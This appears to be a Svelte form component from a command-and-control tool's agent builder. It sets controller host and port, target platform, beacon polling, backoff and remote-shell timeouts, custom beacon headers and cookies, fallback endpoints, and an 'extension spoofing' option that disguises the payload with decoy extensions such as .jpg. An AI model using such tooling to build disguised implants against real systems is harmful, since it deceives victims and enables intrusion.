<script lang="ts">
	import { Badge } from '$lib/components/ui/badge/index.js';
	import { Button } from '$lib/components/ui/button/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import { TARGET_OS_OPTIONS, ARCHITECTURE_OPTIONS_BY_OS, EXTENSION_OPTIONS_BY_OS, EXTENSION_SPOOF_PRESETS, INPUT_FIELD_CLASSES, type CookieKV, type Endpoint, type ExtensionSpoofPreset, type HeaderKV, type TargetArch, type TargetOS } from '../lib/constants.js';
	import { inputValueFromEvent } from '../lib/utils.js';
	import { Plus, Trash2 } from '@lucide/svelte';

	export let host: string;
	export let port: string;
	export let outputFilename: string;
	export let effectiveOutputFilename: string;
	export let groupTag: string;
	export let targetOS: TargetOS;
	export let targetArch: TargetArch;
	export let outputExtension: string;
	export let extensionSpoofingEnabled: boolean;
	export let extensionSpoofPreset: ExtensionSpoofPreset;
	export let extensionSpoofCustom: string;
	export let extensionSpoofError: string | null;
	export let pollIntervalMs: string;
	export let maxBackoffMs: string;
	export let shellTimeoutSeconds: string;
	export let fallbackEndpoints: Endpoint[];
	export let customHeaders: HeaderKV[];
	export let customCookies: CookieKV[];

	export let setFallbackEndpoint: (index: number, key: 'host' | 'port', value: string) => void;
	export let addFallbackEndpoint: () => void;
	export let removeFallbackEndpoint: (index: number) => void;
	export let addCustomHeader: () => void;
	export let updateCustomHeader: (index: number, key: keyof HeaderKV, value: string) => void;
	export let removeCustomHeader: (index: number) => void;
	export let addCustomCookie: () => void;
	export let updateCustomCookie: (index: number, key: keyof CookieKV, value: string) => void;
	export let removeCustomCookie: (index: number) => void;
</script>

<section class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
	<div class="space-y-1">
		<h3 class="text-sm font-semibold">Primary endpoint</h3>
		<p class="text-xs text-muted-foreground">
			Configure how new agents establish their first connection.
		</p>
	</div>
	<div class="grid gap-6 md:grid-cols-2">
		<div class="grid gap-2">
			<Label for="host">Host</Label>
			<Input id="host" placeholder="controller.tenvy.local" bind:value={host} />
		</div>
		<div class="grid gap-2">
			<Label for="port">Port</Label>
			<Input id="port" placeholder="2332" bind:value={port} inputmode="numeric" />
		</div>
		<div class="grid gap-2">
			<Label for="output">Output filename</Label>
			<Input id="output" placeholder="tenvy-client" bind:value={outputFilename} />
			<p class="text-xs text-muted-foreground">
				Final artifact name:
				<code class="rounded bg-muted px-1.5 py-0.5 text-[0.7rem] font-semibold text-foreground">
					{effectiveOutputFilename}
				</code>
			</p>
		</div>
		<div class="grid gap-2">
			<Label for="group-tag">Group tag</Label>
			<Input id="group-tag" placeholder="operations-east" bind:value={groupTag} />
			<p class="text-xs text-muted-foreground">
				Optional label used to keep related deployments together.
			</p>
		</div>
	</div>
</section>

<section class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
	<div class="space-y-1">
		<h3 class="text-sm font-semibold">Target platform</h3>
		<p class="text-xs text-muted-foreground">
			Choose the operating system, architecture, and packaging format.
		</p>
	</div>
	<div class="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
		<div class="grid gap-2">
			<Label for="target-os">Target operating system</Label>
			<select
				id="target-os"
				bind:value={targetOS}
				class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50"
			>
				{#each TARGET_OS_OPTIONS as option (option.value)}
					<option value={option.value}>{option.label}</option>
				{/each}
			</select>
		</div>
		<div class="grid gap-2">
			<Label for="target-arch">Architecture</Label>
			<select
				id="target-arch"
				bind:value={targetArch}
				class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50"
			>
				{#each ARCHITECTURE_OPTIONS_BY_OS[targetOS] ?? [] as option (option.value)}
					<option value={option.value}>{option.label}</option>
				{/each}
			</select>
		</div>
		<div class="grid gap-2">
			<Label for="extension">File extension</Label>
			<select
				id="extension"
				bind:value={outputExtension}
				class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50"
			>
				{#each EXTENSION_OPTIONS_BY_OS[targetOS] ?? [] as option (option)}
					<option value={option}>{option}</option>
				{/each}
			</select>
		</div>
		<div class="md:col-span-2 lg:col-span-3">
			<div class="space-y-4 rounded-lg border border-dashed border-border/70 bg-background/40 p-4">
				<div class="flex flex-wrap items-center justify-between gap-3">
					<div>
						<p class="text-sm font-semibold">Extension spoofing</p>
						<p class="text-xs text-muted-foreground">
							Append a decoy extension before the actual package to disguise the payload.
						</p>
					</div>
					<div class="flex items-center gap-2 text-xs text-muted-foreground">
						<Switch bind:checked={extensionSpoofingEnabled} aria-label="Toggle extension spoofing" />
						<span>{extensionSpoofingEnabled ? 'Enabled' : 'Disabled'}</span>
					</div>
				</div>
				{#if extensionSpoofingEnabled}
					<div class="grid gap-4 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)]">
						<div class="grid gap-2">
							<Label for="spoof-preset">Common disguises</Label>
							<select
								id="spoof-preset"
								bind:value={extensionSpoofPreset}
								class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50"
							>
								{#each EXTENSION_SPOOF_PRESETS as preset (preset)}
									<option value={preset}>{preset}</option>
								{/each}
							</select>
							<p class="text-xs text-muted-foreground">Select a predefined disguise.</p>
						</div>
						<div class="grid gap-2">
							<Label for="spoof-custom">Custom extension</Label>
							<Input
								id="spoof-custom"
								placeholder=".jpg"
								bind:value={extensionSpoofCustom}
								aria-invalid={Boolean(extensionSpoofError)}
							/>
							<p class="text-xs text-muted-foreground">
								Must begin with a dot and include 1-12 letters or numbers.
							</p>
						</div>
					</div>
					{#if extensionSpoofError}
						<p class="text-sm text-destructive">{extensionSpoofError}</p>
					{/if}
				{/if}
			</div>
		</div>
	</div>
</section>

<section class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
	<div class="space-y-1">
		<h3 class="text-sm font-semibold">Connection behaviour</h3>
		<p class="text-xs text-muted-foreground">
			Fine-tune how the agent polls the controller and handles network jitter.
		</p>
	</div>
	<div class="grid gap-6 md:grid-cols-3">
		<div class="grid gap-2">
			<Label for="poll-interval">Poll interval (ms)</Label>
			<Input
				id="poll-interval"
				placeholder="5000"
				bind:value={pollIntervalMs}
				inputmode="numeric"
			/>
			<p class="text-xs text-muted-foreground">Leave blank to use the controller default.</p>
		</div>
		<div class="grid gap-2">
			<Label for="max-backoff">Max backoff (ms)</Label>
			<Input
				id="max-backoff"
				placeholder="60000"
				bind:value={maxBackoffMs}
				inputmode="numeric"
			/>
			<p class="text-xs text-muted-foreground">
				Determines the ceiling for exponential backoff after failures.
			</p>
		</div>
		<div class="grid gap-2">
			<Label for="shell-timeout">Shell timeout (s)</Label>
			<Input
				id="shell-timeout"
				placeholder="30"
				bind:value={shellTimeoutSeconds}
				inputmode="numeric"
			/>
			<p class="text-xs text-muted-foreground">
				Applies to remote shell commands without explicit overrides.
			</p>
		</div>
	</div>
	<div class="space-y-6 rounded-lg border border-dashed border-border/70 p-4">
		<div class="flex flex-wrap items-center justify-between gap-2">
			<div>
				<p class="text-sm font-semibold">Network customization</p>
				<p class="text-xs text-muted-foreground">
					Override HTTP headers or cookies embedded in beacon traffic.
				</p>
			</div>
			<Badge
				variant="outline"
				class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
			>
				Advanced
			</Badge>
		</div>
		<div class="space-y-3">
			<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
				Custom headers
			</p>
			<div class="space-y-3">
				{#each customHeaders as header, index (index)}
					<div class="grid gap-2 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)_auto] md:items-center">
						<input
							class={INPUT_FIELD_CLASSES}
							placeholder="Header name"
							value={header.key}
							oninput={(event) => updateCustomHeader(index, 'key', inputValueFromEvent(event))}
						/>
						<input
							class={INPUT_FIELD_CLASSES}
							placeholder="Header value"
							value={header.value}
							oninput={(event) => updateCustomHeader(index, 'value', inputValueFromEvent(event))}
						/>
						<Button
							type="button"
							variant="ghost"
							size="sm"
							class="text-destructive hover:text-destructive"
							onclick={() => removeCustomHeader(index)}
						>
							<Trash2 class="h-4 w-4" />
							<span class="sr-only">Remove header</span>
						</Button>
					</div>
				{/each}
			</div>
			<Button
				type="button"
				variant="ghost"
				size="sm"
				class="text-xs font-semibold tracking-wide text-muted-foreground uppercase"
				onclick={addCustomHeader}
			>
				<Plus class="h-4 w-4" />
				Add header
			</Button>
		</div>
		<div class="space-y-3">
			<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
				Custom cookies
			</p>
			<div class="space-y-3">
				{#each customCookies as cookie, index (index)}
					<div class="grid gap-2 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)_auto] md:items-center">
						<input
							class={INPUT_FIELD_CLASSES}
							placeholder="Cookie name"
							value={cookie.name}
							oninput={(event) => updateCustomCookie(index, 'name', inputValueFromEvent(event))}
						/>
						<input
							class={INPUT_FIELD_CLASSES}
							placeholder="Cookie value"
							value={cookie.value}
							oninput={(event) => updateCustomCookie(index, 'value', inputValueFromEvent(event))}
						/>
						<Button
							type="button"
							variant="ghost"
							size="sm"
							class="text-destructive hover:text-destructive"
							onclick={() => removeCustomCookie(index)}
						>
							<Trash2 class="h-4 w-4" />
							<span class="sr-only">Remove cookie</span>
						</Button>
					</div>
				{/each}
			</div>
			<Button
				type="button"
				variant="ghost"
				size="sm"
				class="text-xs font-semibold tracking-wide text-muted-foreground uppercase"
				onclick={addCustomCookie}
			>
				<Plus class="h-4 w-4" />
				Add cookie
			</Button>
		</div>
	</div>
</section>

<section class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm">
	<div class="space-y-1">
		<h3 class="text-sm font-semibold">Backup endpoints</h3>
		<p class="text-xs text-muted-foreground">
			Add fallback controller addresses the agent can rotate through if the primary host is
			unavailable.
		</p>
	</div>
	<div class="space-y-4">
		<div class="flex items-center justify-between">
			<Button type="button" variant="outline" size="sm" onclick={addFallbackEndpoint}>
				<Plus class="h-4 w-4" />
				Add endpoint
			</Button>
			<p class="text-xs text-muted-foreground">
				Agents iterate through backups using exponential backoff.
			</p>
		</div>
		{#each fallbackEndpoints as endpoint, index (index)}
			<div class="grid gap-2 md:grid-cols-[minmax(0,1.5fr)_minmax(0,1fr)_auto] md:items-center">
				<input
					class={INPUT_FIELD_CLASSES}
					placeholder="backup.controller.local"
					value={endpoint.host}
					oninput={(event) =>
						setFallbackEndpoint(index, 'host', inputValueFromEvent(event))}
				/>
				<input
					class={INPUT_FIELD_CLASSES}
					placeholder="2332"
					value={endpoint.port}
					oninput={(event) =>
						setFallbackEndpoint(index, 'port', inputValueFromEvent(event))}
				/>
				<Button
					type="button"
					variant="ghost"
					size="sm"
					class="text-destructive hover:text-destructive"
					onclick={() => removeFallbackEndpoint(index)}
				>
					<Trash2 class="h-4 w-4" />
					<span class="sr-only">Remove endpoint</span>
				</Button>
			</div>
		{/each}
	</div>
</section>
